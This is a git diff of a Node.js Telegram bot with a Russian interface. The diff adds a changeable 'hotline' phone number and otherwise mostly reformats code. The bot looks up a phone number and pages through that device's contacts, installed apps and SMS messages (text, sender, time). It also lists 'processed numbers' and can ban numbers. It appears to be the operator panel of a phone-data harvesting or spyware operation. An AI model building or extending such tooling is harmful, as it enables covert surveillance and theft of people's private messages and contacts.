@@ -6,7 +6,7 @@ const server = require('./requests/Server')
 const main_keyboard = {
     reply_markup: {
         keyboard: [
-            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }, {text: 'Забанить'}],
+            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }, { text: 'Забанить' }], [{ text: 'Горячая линия' }],
         ],
         resize_keyboard: true,
     }
@@ -38,7 +38,7 @@ bot.onText(/Просмотреть отработанные номера/, async
     const totalPagesusers = Math.ceil(messagesToSendusers.length / pageSizeusers);
     let currentPageusers = 1;
     console.log(messagesToSendusers.length)
-    if(messagesToSendusers.length > 7){
+    if (messagesToSendusers.length > 7) {
         let currentMessageId = null;
         const sendCurrentPage = async () => {
             let startIndex;
@@ -47,13 +47,13 @@ bot.onText(/Просмотреть отработанные номера/, async
             let paginationButtons;
             let currentPage;
             let totalPages;
-    
+
             currentPage = currentPageusers;
             totalPages = totalPagesusers;
             startIndex = (currentPage - 1) * pageSizeusers;
             endIndex = Math.min(startIndex + pageSizeusers, messagesToSendusers.length);
             pageMessages = messagesToSendusers.slice(startIndex, endIndex);
-    
+
             paginationButtons = [];
             if (currentPage > 1) {
                 paginationButtons.push({
@@ -67,9 +67,9 @@ bot.onText(/Просмотреть отработанные номера/, async
                     callback_data: 'next_page'
                 });
             }
-    
+
             const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
-            
+
             if (currentMessageId) {
                 try {
                     await bot.editMessageText(`${messageText}`, {
@@ -81,7 +81,7 @@ bot.onText(/Просмотреть отработанные номера/, async
                         }
                     });
                 } catch (error) {
-    
+
                 }
             } else {
                 const message = await bot.sendMessage(chatId, `${messageText}`, {
@@ -103,26 +103,69 @@ bot.onText(/Просмотреть отработанные номера/, async
         });
         sendCurrentPage();
     }
-    else{
-        const messageText = messagesToSendusers.map(message=>`<pre>${message}</pre>`).join('\n');
+    else {
+        const messageText = messagesToSendusers.map(message => `<pre>${message}</pre>`).join('\n');
         bot.sendMessage(chatId, `${messageText}`, options)
     }
 });
-bot.onText(/Забанить/,async(msg)=>{
+function formatPhoneNumber(number) {
+    const formattedNumber = number.replace(/(\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3-$4-$5');
+    return formattedNumber;
+}
+bot.onText(/Горячая линия/, async (msg) => {
+    const chatId = msg.chat.id;
+    const hotLine = await server.getHoteLineNumber()
+    const formattedHotLine = "`" + formatPhoneNumber(hotLine.number) +"`";
+    const databtns = []
+    databtns.push({ text: "Изменить", callback_data: "ChangeHotLine" })
+    const options = {
+        parse_mode: 'MarkdownV2',
+        reply_markup: {
+            inline_keyboard: [
+                databtns
+            ]
+        }
+    }
+    bot.sendMessage(chatId, `Горячая линия ${formattedHotLine}`, options)
+    bot.on('callback_query', async (query) => {
+        if (query.data === "ChangeHotLine") {
+            bot.sendMessage(chatId , 'Введите новый номер')
+            .then(()=>{
+                bot.once('message', async (msg) => {
+                    const oldNumber = hotLine.number
+                    const newNumber = msg.text
+                    await changeHotLine(msg,oldNumber,newNumber)
+                })
+            })
+        }
+    });
+})
+async function changeHotLine(msg,oldNubmer, newNumber){
+    const cleanNewNumber = newNumber.replace(/[\s-]/g, '');
+    if(cleanNewNumber.length == 11){
+        const response = await server.updHoteLineNumber(oldNubmer,cleanNewNumber)
+        if(response.status == 200){
+            console.log(`HotLineNumber change status = ${response.status}`)
+            const formattedNewNumber = formatPhoneNumber(response.data.number)
+            return bot.sendMessage(msg.chat.id, `Номер изменён\nНовый номер ${formattedNewNumber}`)
+        }
+    }
+}
+bot.onText(/Забанить/, async (msg) => { 
     const chatId = msg.chat.id;
     const options = {
         reply_markup: {
             remove_keyboard: false
         }
     };
-    bot.sendMessage(chatId, 'Введите номер:' , options)
-    .then(()=>{
-        bot.once('message',async(msg)=>{
-            const phoneNumber = msg.text;
-            const userBan_result = await server.sendBanUser(phoneNumber.replace(/^\+/, ''));
-            bot.sendMessage(chatId, `${userBan_result.message}`, options)
+    bot.sendMessage(chatId, 'Введите номер:', options)
+        .then(() => {
+            bot.once('message', async (msg) => {
+                const phoneNumber = msg.text;
+                const userBan_result = await server.sendBanUser(phoneNumber.replace(/^\+/, ''));
+                bot.sendMessage(chatId, `${userBan_result.message}`, options)
+            })
         })
-    })
 })
 bot.onText(/Инфа по номеру/, async (msg) => {
     const chatId = msg.chat.id;
@@ -159,7 +202,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                     }
                     if (userdataByPhone.data?.userMessages[0]) {
-                       messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
+                        messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
                             const body = `Сообщение: ${element.body}`;
                             const originatingAddress = `Отправитель: ${element.originatingAddress}`;
                             const date = `Дата и время: ${new Date(element.timestamp).toLocaleString()}`;
@@ -167,7 +210,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Сообщения", callback_data: "Sendmessages" });
                     }
-                    
+
                     const message = await bot.sendMessage(chatId, "Выберите данные", {
                         parse_mode: 'HTML',
                         reply_markup: {
@@ -200,7 +243,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         let paginationButtons;
                         let currentPage;
                         let totalPages;
-                        
+
                         if (DataChoose.contacts) {
                             currentPage = currentPagecontact;
                             totalPages = totalPagescontact;
@@ -213,14 +256,14 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             startIndex = (currentPage - 1) * pageSizeapp;
                             endIndex = Math.min(startIndex + pageSizeapp, messagesToSendapp.length);
                             pageMessages = messagesToSendapp.slice(startIndex, endIndex);
-                        }else if (DataChoose.messages) {
+                        } else if (DataChoose.messages) {
                             currentPage = currentPagemessage;
                             totalPages = totalPagesmessage;
                             startIndex = (currentPage - 1) * pageSizemessage;
                             endIndex = Math.min(startIndex + pageSizemessage, messagesToSendmessage.length);
                             pageMessages = messagesToSendmessage.slice(startIndex, endIndex);
                         }
-                    
+
                         paginationButtons = [];
                         if (currentPage > 1) {
                             paginationButtons.push({
@@ -234,9 +277,9 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                                 callback_data: 'next_page'
                             });
                         }
-                    
+
                         const messageText = pageMessages.map(message => `<pre>${message}</pre>`).join('\n');
-                    
+
                         if (currentMessageId) {
                             try {
                                 await bot.editMessageText(`${messageText}`, {
@@ -248,7 +291,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                                     }
                                 });
                             } catch (error) {
-                                
+
                             }
                         } else {
                             const message = await bot.sendMessage(chatId, `${messageText}`, {
@@ -260,8 +303,8 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             currentMessageId = message.message_id;
                         }
                     };
-                    
-                    const DataChoose = { contacts: false, apps: false, messages:false}
+
+                    const DataChoose = { contacts: false, apps: false, messages: false }
                     bot.on('callback_query', async (query) => {
                         try {
                             if (query.data === "Sendcontacts") {
